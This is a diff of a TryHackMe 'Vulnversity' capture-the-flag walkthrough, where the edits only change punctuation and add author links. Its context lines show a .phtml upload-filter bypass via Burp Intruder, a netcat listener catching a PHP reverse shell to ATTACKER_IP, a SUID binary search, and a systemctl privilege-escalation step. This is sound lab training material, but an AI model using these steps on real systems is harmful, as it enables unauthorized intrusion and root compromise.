@@ -1,7 +1,7 @@
 ---
 link: https://tryhackme.com/room/vulnversity
 difficulty: Easy
-description: Command-only reference — Linux host, full-port recon, .phtml upload-filter bypass to a www-data shell, SUID systemctl to root.
+description: Command-only reference. Linux host, full-port recon, .phtml upload-filter bypass to a www-data shell, SUID systemctl to root.
 ---
 
 <div style="text-align: center; padding: 80px 40px; page-break-after: always;">
@@ -13,8 +13,8 @@ description: Command-only reference — Linux host, full-port recon, .phtml uplo
   <img src="https://cdn-images.tryhackme.com/room-icons/85dee7ce633f5668b104d329da2769c3.png" style="width: 400px; margin-bottom: 60px;" />
 
   <div style="font-size: 22px; line-height: 2.2;">
-    <p style="margin: 0;">Prepared by: nedmoeca</p>
-    <p style="margin: 0;">Author(s): 1337rce</p>
+    <p style="margin: 0;">Prepared by: <a href="https://tryhackme.com/p/nedmoeca">nedmoeca</a></p>
+    <p style="margin: 0;">Author(s): <a href="https://tryhackme.com/p/1337rce">1337rce</a></p>
     <p style="margin: 0;">Difficulty: Easy</p>
     <p style="margin: 0;">Date: DD Month Year</p>
   </div>
@@ -31,13 +31,13 @@ description: Command-only reference — Linux host, full-port recon, .phtml uplo
 | Token         | Where to get it                                                                    |
 | ------------- | --------------------------------------------------------------------------------- |
 | `TARGET_IP`   | The target machine IP shown on the room page after deploy. Changes per spawn.      |
-| `ATTACKER_IP` | Your THM VPN address — `ip addr show tun0`. Reassigned on every VPN reconnect.     |
+| `ATTACKER_IP` | Your THM VPN address (`ip addr show tun0`). Reassigned on every VPN reconnect.     |
 
-Flags (`user.txt`, `root.txt`) are omitted deliberately — read them yourself with the commands shown.
+Flags (`user.txt`, `root.txt`) are omitted deliberately; read them yourself with the commands shown.
 
 ## Terminal / host map
 
-No pivoting — single target. But mind where each command runs:
+No pivoting; single target. Mind where each command runs:
 
 - **Attack box:** `nmap`, `gobuster`, Burp, `nc -lvnp`, `cp`/`sed`/`grep` on the local shell copy, browser uploads.
 - **Target (inside the caught `www-data` shell):** `ls /home`, `cat .../user.txt`, `find ... -perm -4000`, the `systemctl` payload, `cat /tmp/rootflag.txt`.
@@ -89,7 +89,7 @@ http://TARGET_IP:3333/internal/
 1. Proxy > Intercept **on**, upload `test.php` through the form at `http://TARGET_IP:3333/internal/` to capture the request.
 2. Confirm it is `POST /internal/index.php`, `multipart/form-data`, with `filename="test.php"`.
 3. Right-click > **Send to Intruder**, intercept **off**.
-4. Positions tab: **Clear §**, highlight only the extension, **Add §** → `filename="test.§php§"`. Attack type **Sniper**.
+4. Positions tab: **Clear §**, highlight only the extension, **Add §** so it reads `filename="test.§php§"`. Attack type **Sniper**.
 5. Payloads > Simple list:
 
 ```
@@ -100,7 +100,7 @@ php5
 phtml
 ```
 
-6. **Start attack**, compare the **Length** column. The outlier (`phtml`) is the accepted extension — Apache still executes `.phtml` as PHP.
+6. **Start attack**, compare the **Length** column. The outlier (`phtml`) is the accepted extension; Apache still executes `.phtml` as PHP.
 
 ### Get a reverse shell
 
@@ -123,7 +123,7 @@ Start the listener and leave it running (must be up before you trigger the shell
 nc -lvnp 1234
 ```
 
-Upload `php-reverse-shell.phtml` through the form, then trigger it by browsing to it — the tab will hang, that's expected:
+Upload `php-reverse-shell.phtml` through the form, then trigger it by browsing to it; the tab will hang, that's expected:
 
 ```
 http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
@@ -141,7 +141,7 @@ cat /home/bill/user.txt
 
 ## Task 5 Privilege Escalation
 
-Find SUID binaries (on the target) — `/bin/systemctl` is the outlier:
+Find SUID binaries (on the target); `/bin/systemctl` is the outlier:
 
 ```
 find / -perm -4000 -type f 2>/dev/null
@@ -151,7 +151,7 @@ find / -perm -4000 -type f 2>/dev/null
 ls -l /bin/systemctl
 ```
 
-Weaponize SUID `systemctl` — write a oneshot unit and start it as root. Keep the multi-line `echo` intact:
+Weaponize SUID `systemctl`: write a oneshot unit and start it as root. Keep the multi-line `echo` intact:
 
 ```
 TF=$(mktemp).service
@@ -170,7 +170,7 @@ cat /tmp/rootflag.txt
 
 ## References
 
-## Fill-in — per-spawn values
+## Fill-in: per-spawn values
 
 | Token         | Value (fill in) |
 | ------------- | --------------- |
